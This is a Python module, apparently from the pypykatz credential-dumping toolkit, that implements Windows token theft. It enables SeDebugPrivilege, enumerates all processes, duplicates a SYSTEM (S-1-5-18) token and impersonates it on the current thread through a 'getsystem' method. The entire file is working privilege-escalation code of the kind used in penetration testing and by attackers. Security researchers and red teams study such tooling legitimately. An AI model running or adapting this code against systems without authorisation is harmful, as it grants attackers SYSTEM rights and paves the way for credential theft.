from pypykatz import logger
from pypykatz.commons.winapi.constants import *
from pypykatz.commons.winapi.local.localwindowsapi import LocalWindowsAPI


class TokenInfo:
    def __init__(self, pid, domain, username, sid, token_type):
        self.pid = pid
        self.domain = domain
        self.username = username
        self.sid = sid
        self.token_type = token_type

    def __str__(self):
        return '%s:%s:%s:%s:%s' % (self.pid, self.domain, self.username, self.sid, self.token_type)


class ProcessManipulator:

    def __init__(self, pid=None, api=None):
        self.pid = pid
        self.api = api if api is not None else LocalWindowsAPI()

    def set_privilege(self, privilige_id, thread_or_process=False):

        logger.debug('[ProcessManipulator] Setting %s privilege' % privilige_id)
        return self.api.ntdll.RtlAdjustPrivilege(privilige_id, enable=True, thread_or_process=thread_or_process)

    def get_current_token_info(self):

        proc_handle = None
        try:
            pid = self.api.kernel32.GetCurrentProcessId()
            proc_handle = self.api.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
        except Exception as e:
            raise e
        else:
            try:
                token_handle = self.api.advapi32.OpenProcessToken(proc_handle, TOKEN_MANIP_ACCESS)
                return self.get_token_info(token_handle, pid)
            except Exception as e:
                raise e
            finally:
                if token_handle is not None:
                    self.api.kernel32.CloseHandle(token_handle)
        finally:
            if proc_handle is not None:
                self.api.kernel32.CloseHandle(proc_handle)

    def get_token_info(self, token_handle, pid):
        ptr_sid = self.api.advapi32.GetTokenInformation_sid(token_handle)
        sid_str = self.api.advapi32.ConvertSidToStringSid(ptr_sid)
        name, domain, token_type = self.api.advapi32.LookupAccountSid(None, ptr_sid)
        return TokenInfo(pid, domain, name, sid_str, token_type)

    def get_token_for_sid(self, target_sid='S-1-5-18', dwDesiredAccess=TOKEN_ALL_ACCESS,
                          ImpersonationLevel=SecurityImpersonation, TokenType=SecurityImpersonation):

        try:
            self.set_privilege(SE_DEBUG)
        except Exception as e:
            logger.error('Failed to obtain SE_DEBUG privilege!')
            raise e

        token_infos = []
        for pid in self.api.psapi.EnumProcesses():
            proc_handle = None
            try:
                proc_handle = self.api.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
                logger.log(1, '[ProcessManipulator] Proc handle for PID %s is: %s' % (proc_handle, pid))
            except Exception as e:
                logger.log(1, '[ProcessManipulator] Failed to open process pid %s Reason: %s' % (pid, str(e)))
                continue

            else:
                token_handle = None
                try:
                    token_handle = self.api.advapi32.OpenProcessToken(proc_handle, TOKEN_MANIP_ACCESS)
                except Exception as e:
                    logger.log(1,
                               '[ProcessManipulator] Failed get token from process pid %s Reason: %s' % (pid, str(e)))
                    continue
                else:
                    ptr_sid = self.api.advapi32.GetTokenInformation_sid(token_handle)
                    sid_str = self.api.advapi32.ConvertSidToStringSid(ptr_sid)
                    if sid_str == target_sid:
                        logger.debug('[ProcessManipulator] Found token with target sid!')
                        cloned_token = self.api.advapi32.DuplicateTokenEx(
                            token_handle,
                            dwDesiredAccess=dwDesiredAccess,
                            ImpersonationLevel=ImpersonationLevel,
                            TokenType=TokenType
                        )
                        yield cloned_token

                finally:
                    if token_handle is not None:
                        self.api.kernel32.CloseHandle(token_handle)

            finally:
                if proc_handle is not None:
                    self.api.kernel32.CloseHandle(proc_handle)

        return token_infos

    def assign_token_thread_sid(self, target_sid='S-1-5-18'):

        for token in self.get_token_for_sid(target_sid=target_sid, dwDesiredAccess=TOKEN_QUERY | TOKEN_IMPERSONATE,
                                            ImpersonationLevel=SecurityDelegation, TokenType=TokenImpersonation):
            logger.debug('[ProcessManipulator] Setting token to current thread...')
            try:
                self.api.advapi32.SetThreadToken(token)
            except Exception as e:
                logger.log(1, 'Failed changing the thread token. Reason: %s' % e)
                continue
            else:
                logger.debug('[ProcessManipulator] Sucsessfully set token to current thread!')
                break

    def getsystem(self):
        self.assign_token_thread_sid('S-1-5-18')

    def dropsystem(self):
        self.api.advapi32.RevertToSelf()


if __name__ == '__main__':
    pm = ProcessManipulator()

    ti = pm.get_current_token_info()
    print(str(ti))
